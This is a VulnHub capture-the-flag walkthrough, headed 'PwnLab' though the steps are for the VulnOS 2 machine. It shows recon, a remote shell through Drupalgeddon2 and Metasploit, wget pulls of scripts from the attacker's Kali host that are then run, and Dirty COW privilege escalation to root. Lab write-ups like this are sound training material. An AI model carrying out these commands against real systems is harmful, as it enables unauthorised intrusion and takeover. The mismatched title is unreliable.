# VulnHub - PwnLab

[Vulnhub Link](https://www.vulnhub.com/entry/pwnlab-init,158/)

## Step 0 - Pre-requisite

Begin by downloading the [pwnlab.ova](https://download.vulnhub.com/pwnlab/pwnlab_init.ova) (Mirror file [[mirror]](https://mega.nz/#!iAVXDKaC!Fwjd20Jv_2ErRpGVOzpgFlmPHBN-E-kb63CWogjoKw0)) file to kickstart the installation process.

Next, launch Oracle VM VirtualBox and navigate to File > Import Appliance.
![Import Appliance](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/df98cf82-b1be-4b90-867c-cc8e8674449f)


Locate and select the downloaded ova file to proceed.

![File Select](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/741eac51-e4fd-4304-af12-b588fd2785df)



Click "Next" and specify the desired installation location for the machine. Confirm by clicking "Finish."
![OVA Intall final](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/f7d37db9-71d6-46ae-b202-bc0e71228a8b)


Wait for VM VirtualBox to import the appliance.

Now that the your machine is successfully installed, let's ensure it shares the same network as our Kali Machine.

To achieve this, right-click on your machine, navigate to settings, access the network tab, and select the advanced option. Opt for paravirtualized network.

> Note: Repeat the identical process for your Kali Linux Machine to maintain network coherence.

## Step 1 - Reconnaissance
> In recon we are supposed to gather information about the target.

Let's start by finding the IP address of our Target. Using ARP-SCAN

![1](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/9fe9ccce-c35b-4505-aa9b-9031d7836e90)

The PCS Systemtechnik GmbH is our machine

## Step 1 - Scanning
Let's perform a comprehensive NMAP scan on our target using

	sudo nmap -sV -sC -A -O -sS -T4 -oN nmap-scan.txt 192.168.0.128
 
![2](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/11d12b0e-74a9-428c-a4d7-675c63551783)

Port 80 is open, which means there is a web server, let’s open it.

![3](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/888c4674-fddc-429c-b08f-39f403264be1)

![4](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/8c500c18-b2eb-463c-8beb-5c78ec6d0c88)


Let’s run some scans in the background while we explore the website.

    nikto -h http://192.168.0.128/jabc

Also, let’s explore the Page Source Code

![5](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/549a573f-414e-415b-92cd-4140003ccaf5)


We can see that the page also runs on Drupal 7, so let’s use droopescan. 
Let’s clone the droopescan GitHub project  by using

	git clone https://github.com/SamJoan/droopescan.git

Cd into the folder

	cd droopescan

![6](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/05fef50a-fecc-4c59-a478-f835a633cf4a)

We have to scan a Drupal site so we’ll use the syntax

    ./droopescan scan drupal -u 192.168.0.128/jabc

![7](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/1764fc95-4b05-4116-bfd9-a56628a82456)

We’re running version 7.22 – 7.26 of Drupal, let’s check the internet to see if we have any known exploits for these.

## Step 3 - Gaining Access
We have two ways to gain a remote shell

 1. Drupalgeddon2
 2. Metasploit

**Drupalgeddon2**
It looks like it can remote shell, let’s clone this too

    git clone https://github.com/dreadlocked/Drupalgeddon2.git

Let’s enter the folder 

    cd Drupalgeddon2

Let’s use the ruby script according to the readme.md on GitHub

    ./drupalgeddon2.rb http://192.168.0.128/jabc

![8](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/d01123ed-f6bf-4894-b9fe-b058d05515a4)


We got a remote shell!

> You might get an error, something like

> internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:86:in
> `require': cannot load such file -- highline/import (LoadError) 

>This  can be easily solved by downloading highline by using this command 
    > `sudo gem install highline`



**Metasploit**
Another way to use this exploit is using Metasploit
Let’s start Metasploit by typing out 

    msfconsole     

![9](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/86c9531b-13f9-402f-981f-ceefbf68e331)



Let’s search for the Drupalgeddon2 exploit 

    search Drupalgeddon2 

We get one result

![10](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/257cef13-6ff1-4628-a896-9da176c03e6b)


Let’s select the module by

    use 0

Now let’s add the appropriate options, to see the options type out

    options

![11](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/dd4a14c9-fa2b-453e-bd93-cfe52f76a625)


Let’s fill in all the options

![12](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/12590df4-47d9-4a60-950a-fb614d9dc400)


Let’s exploit by using 

    exploit

![13](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/69b164b0-5105-4f7a-beec-c8b704048690)

We got a meterpreter shell

Let’s convert it into a system shell by using 

    shell

![14](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/42b3c1b6-96ec-4b82-9b57-d79e7a879ae4)


Let’s upgrade our shell to bash by

    python -c "import pty; pty.spawn('/bin/bash')"

![15](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/a9cfc105-b19b-438d-8f5c-338925aff59c)


There we go, now let’s enumerate.

![16](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/c4ad29df-bf2e-4cd4-897b-ec5ce1d153f2)


We’re on an old version of Ubuntu, let’s see if any exploit is possible for our current version. For that, we’ll use the Linux Exploit Suggester module on GitHub. Let’s download this.

Open a new terminal and 

    git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git

Let’s go inside the dir

    cd linux-exploit-suggester

I’ll move and rename the script file to a folder back

    cp linux-exploit-suggester.sh ../script.sh


This made a copy of the linux-exploit-suggester.sh on my main project folder (one folder back)
Let’s go back a folder 

    cd ..

Now we have to run this script on the target machine so that the script can scan the machine and tell us all about the possible exploits.

To transfer this script from Kali machine to the target machine we’ll start a Python server (in the same directory as the script.sh file) and download the file using wget on the target machine.

![17](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/c4efba11-1a1e-4f82-9f05-0b677fb03ead)


Let’s go back to our remote shell and download the script file.

Since we can’t download or run files anywhere on the target website except the /tmp folder we’ll navigate there and then download the file.

    www-data@VulnOSv2:/tmp$ cd /tmp

To download the file from our kali machine, we’ll

    www-data@VulnOSv2:/tmp$ wget http://192.168.0.190:80/script.sh

![18](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/eeeea31c-3ffb-4ec3-bff9-3641571a59c7)


There we go, now we have the script.sh file on our target server.

Let’s give it execute permissions and we’ll execute it

    www-data@VulnOSv2:/tmp$ chmod +x script.sh
    www-data@VulnOSv2:/tmp$ ./script.sh

We’ll get a lot of possible exploits, we’ll go with the one that has an exposure of “highly probable”

Let’s try the dirtycow 2 exploit

![19](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/527c6dac-c1a7-4a15-80dd-d9646cbfbbaf)


This is the exploit file https://www.exploit-db.com/download/40847
Let’s download this on our Kali machine 

    Firefox https://www.exploit-db.com/download/40847 &

![20](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/725ed67f-e95a-478b-b9dd-09b4564bddba)


Let’s move this to our project folder 

    ┌──(kali㉿kali)-[~/vulnhub/markup/vuln-os-2]
    └─$ cp ~/Downloads/40847.cpp .

Let’s move this over to the target machine and then we’ll compile this over there.

Again, make sure that our Python server is running and in the same folder, we have the 40847.cpp file.

I’ll rename it to something easy like dirty.cpp

    mv 40847.cpp dirty.cpp            

Let’s go over to our remote shell and download this cpp file

    www-data@VulnOSv2:/tmp$ wget http://192.168.0.190:80/dirty.cpp

![21](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/a920c0c1-3db5-43b8-9872-2682777ba0ab)



Now we need to compile the dirty.cpp file, according to the instructions we have to use 

    g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dirty.cpp -lutil


![22](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/7261ffcc-5155-4ddc-826c-ff3be107cb3a)


Let’s run the dcow file to hopefully get root privileges

    ./dcow -s

![23](https://github.com/omarMahmood05/Vulnhub---VulnOs2---Markup/assets/86721437/85b86fb7-6d40-4ebb-bfa2-9c2c3fd3e2d6)


There we go, now we have root access.
